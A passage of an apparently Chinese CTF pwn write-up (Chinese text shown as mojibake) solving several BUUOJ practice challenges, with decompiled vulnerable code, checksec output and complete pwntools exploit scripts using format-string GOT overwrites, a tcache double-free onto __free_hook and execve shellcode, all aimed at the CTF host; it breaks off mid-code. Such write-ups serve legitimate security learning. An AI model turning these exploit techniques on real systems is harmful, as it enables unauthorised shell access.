**envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+Fh] [rbp-1h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">  fgets(&amp;s, <span class="number">0x3FF</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">11</span> * judge * judge + <span class="number">17</span> * judge * judge * judge * judge - <span class="number">13</span> * judge * judge * judge - <span class="number">7</span> * judge == <span class="number">198</span> )</span><br><span class="line">    system(<span class="string">&quot;exec /bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•å…ˆè·‘ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> judge <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">11</span> * judge * judge + <span class="number">17</span> * judge * judge * judge * judge - <span class="number">13</span> * judge * judge * judge - <span class="number">7</span> * judge == <span class="number">198</span>:</span><br><span class="line">        <span class="built_in">print</span>(judge)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°judgeä¸º2</p><p>ç®€å•è°ƒä¸‹å‘ç°æ˜¯ç¬¬8ä¸ªï¼Œä½†æ˜¯ä¼šè¢«æˆªæ–­ï¼Œæ‰€ä»¥ï¼š</p><p>Expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&quot;./mrctf2020_easy_equation&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28186</span>)</span><br><span class="line"><span class="comment"># payload = &quot;baaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;aa%9$naaa&#x27;</span>+p64(<span class="number">0x060105C</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x4B-wdb-2018-2nd-easyfmt"><a href="#0x4B-wdb-2018-2nd-easyfmt" class="headerlink" title="0x4B.wdb_2018_2nd_easyfmt"></a>0x4B.wdb_2018_2nd_easyfmt</h1><p>è¿˜æ˜¯åªå¼€äº†NXï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+8h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know repeater?&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x64</span>u);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²çš„æ´ï¼Œç›´æ¥å†™readæˆ–printfçš„gotä¸ºsystemï¼Œç®€å•ç¡®å®šä¸‹åç§»ä¸º6ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ ./wdb_2018_2nd_easyfmt </span><br><span class="line">Do you know repeater?</span><br><span class="line">aaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line">aaaa0xffca37a8.0x64.0xf7f0ec08.0xf7f0dd00.0xffca38cc.0x61616161.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e</span><br><span class="line">ï¿½ï¿½ï¿½ï¿½/</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./wdb_2018_2nd_easyfmt&quot;)</span></span><br><span class="line"><span class="comment"># context.arch = &#x27;i386&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27041</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./wdb_2018_2nd_easyfmt&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = p32(printf_got)+ <span class="string">&#x27;%6$s&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">print_addr =u32(io.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(print_addr)</span><br><span class="line">base = print_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_addr = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system_addr&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>æŸ¥äº†åŠå¤©ï¼Œï¼Œï¼Œï¼ŒåŸæ¥æ˜¯libcå†™é”™äº†ã€‚ã€‚fuckã€‚</p><h1 id="0x4C-ciscn-2019-es-1"><a href="#0x4C-ciscn-2019-es-1" class="headerlink" title="0x4C.ciscn_2019_es_1"></a>0x4C.ciscn_2019_es_1</h1><p>ä¿æŠ¤å…¨å¼€ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/Desktop$ checksec ciscn_2019_es_1</span><br><span class="line">[*] <span class="string">&#x27;/home/yutao/Desktop/ciscn_2019_es_1&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>add:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  __int64 *v2; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 size[<span class="number">5</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( heap_number &gt; <span class="number">12</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enough!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = heap_number;</span><br><span class="line">  heap_addr[v1] = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the size of compary&#x27;s name&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, size);</span><br><span class="line">  *(heap_addr[heap_number] + <span class="number">2</span>) = size[<span class="number">0</span>];</span><br><span class="line">  v2 = heap_addr[heap_number];</span><br><span class="line">  *v2 = <span class="built_in">malloc</span>(LODWORD(size[<span class="number">0</span>]));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *heap_addr[heap_number], LODWORD(size[<span class="number">0</span>]));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input compary call:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, heap_addr[heap_number] + <span class="number">12</span>, <span class="number">0xC</span>uLL);</span><br><span class="line">  *(heap_addr[heap_number] + <span class="number">23</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  ++heap_number;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>callå°±æ˜¯freeï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">call</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the index:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( heap_addr[v1] )</span><br><span class="line">    <span class="built_in">free</span>(*heap_addr[v1]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You try it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¯2.27ï¼Œæœ‰tcacheï¼Œå…ˆmallocä¸ªå¤§ä¸€ç‚¹çš„chunkï¼Œfreeåç›´æ¥æ”¾å…¥unsortedbinã€‚ç„¶åå°±æ˜¯æ­£å¸¸æµç¨‹äº†ã€‚</p><p>tmdè°ƒäº†åŠå¤©ç»“æœç»ˆäºå‘ç°å“ªé‡Œæœ‰é—®é¢˜äº†ï¼Œpythonçš„åˆ‡ç‰‡ä¸€ç›´å†™é”™â€¦â€¦</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27004</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_es_1&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-x64-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,name,compary</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;compary&#x27;s name&quot;</span>,<span class="built_in">str</span>(<span class="built_in">int</span>(size)))</span><br><span class="line">io.sendafter(<span class="string">&#x27;input name:&#x27;</span>,name)</span><br><span class="line">io.sendafter(<span class="string">&#x27;call:&#x27;</span>,compary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call</span>(<span class="params">index</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choice&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="string">&#x27;250&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;bbbb&#x27;</span>,<span class="string">&#x27;2223451&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh&#x27;</span>,<span class="string">&#x27;2353&#x27;</span>)</span><br><span class="line">call(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libcbase=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook=libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">call(<span class="number">1</span>)</span><br><span class="line">call(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook),<span class="string">&#x27;13456&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;dddd&#x27;</span>,<span class="string">&#x27;256&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(system),<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line"></span><br><span class="line">call(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x4D-x-ctf-b0verfl0w"><a href="#0x4D-x-ctf-b0verfl0w" class="headerlink" title="0x4D.x_ctf_b0verfl0w"></a>0x4D.x_ctf_b0verfl0w</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec b0verfl0w </span><br><span class="line">[*] <span class="string">&#x27;/home/gwt/Desktop/b0verfl0w&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>å…³äº†nx</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+18h] [ebp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWelcome to X-CTF 2016!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s.&quot;</span>, s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">è¿˜æœ‰ä¸ªhintï¼š</span><br><span class="line">.text:<span class="number">080484F</span>D hint            proc near</span><br><span class="line">.text:<span class="number">080484F</span>D ; __unwind &#123;</span><br><span class="line">.text:<span class="number">080484F</span>D                 push    ebp</span><br><span class="line">.text:<span class="number">080484F</span>E                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">08048500</span>                 sub     esp, <span class="number">24</span>h</span><br><span class="line">.text:<span class="number">08048503</span>                 retn</span><br><span class="line">.text:<span class="number">08048503</span> hint            endp ; sp-analysis failed</span><br><span class="line">.text:<span class="number">08048503</span></span><br><span class="line">.text:<span class="number">08048504</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048504</span>                 jmp     esp</span><br><span class="line">.text:<span class="number">08048506</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048506</span>                 retn</span><br><span class="line">.text:<span class="number">08048507</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048507</span>                 mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0804850</span>C                 pop     ebp</span><br><span class="line">.text:<span class="number">0804850</span>D                 retn</span><br><span class="line">.text:<span class="number">0804850</span>D ; &#125; <span class="comment">// starts at 80484FD</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿˜æ˜¯ä¸€æ®µshellcodeï¼š<code>shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</code></p><p>å…·ä½“çš„payloadæ˜¯è¿™æ ·çš„ï¼š</p><blockquote><p>  payload = shellcode + padding + fake_ebp+ hit_jmp_addr +asm(â€˜sub esp,0x28;jmp espâ€™)</p></blockquote><p>ç¨‹åºleaveåespæŒ‡å‘retçš„ä½ç½®ï¼Œç„¶åretï¼ŒeipæŒ‡å‘äº†hitçš„jmp espçš„ä½ç½®ï¼Œè¿™æ—¶espæŒ‡å‘æ„é€ çš„sub esp,0x28çš„ä½ç½®ï¼Œä¹‹åespæŒ‡å‘shellcodeå¤´çš„ä½ç½®ï¼Œç„¶ååç¨‹åºå†æ¬¡æ‰§è¡Œjmp espï¼Œæ‰§è¡Œshellcode</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28760</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;./b0verfl0w&quot;)</span></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(shellcode)</span><br><span class="line"></span><br><span class="line">jmp_esp=<span class="number">0x8048504</span></span><br><span class="line">sub_esp_jmp=asm(<span class="string">&#x27;sub esp,0x28;jmp esp&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=shellcode+(<span class="number">0x20</span>-<span class="built_in">len</span>(shellcode)+<span class="number">4</span>)*<span class="string">&#x27;a&#x27;</span>+p32(jmp_esp)+sub_esp_jmp</span><br><span class="line">gdb.attach(r)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x4E-picoctf-2018-leak-me"><a href="#0x4E-picoctf-2018-leak-me" class="headerlink" title="0x4E.picoctf_2018_leak_me"></a>0x4E.picoctf_2018_leak_me</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bad sp value at call has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> input[<span class="number">64</span>]; <span class="comment">// [esp+0h] [ebp-194h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">256</span>]; <span class="comment">// [esp+40h] [ebp-154h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> password[<span class="number">64</span>]; <span class="comment">// [esp+140h] [ebp-54h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+180h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// [esp+184h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">__gid_t</span> v9; <span class="comment">// [esp+188h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v10; <span class="comment">// [esp+18Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = &amp;argc;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = getegid();</span><br><span class="line">  setresgid(v9, v9, v9);</span><br><span class="line">  <span class="built_in">memset</span>(password, <span class="number">0</span>, <span class="keyword">sizeof</span>(password));</span><br><span class="line">  <span class="built_in">memset</span>(name, <span class="number">0</span>, <span class="keyword">sizeof</span>(name));</span><br><span class="line">  <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="keyword">sizeof</span>(input));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What is your name?&quot;</span>);</span><br><span class="line">  fgets(name, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v8 = <span class="built_in">strchr</span>(name, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">    *v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcat</span>(name, <span class="string">&quot;,\nPlease Enter the Password.&quot;</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;password.txt&quot;</span>, <span 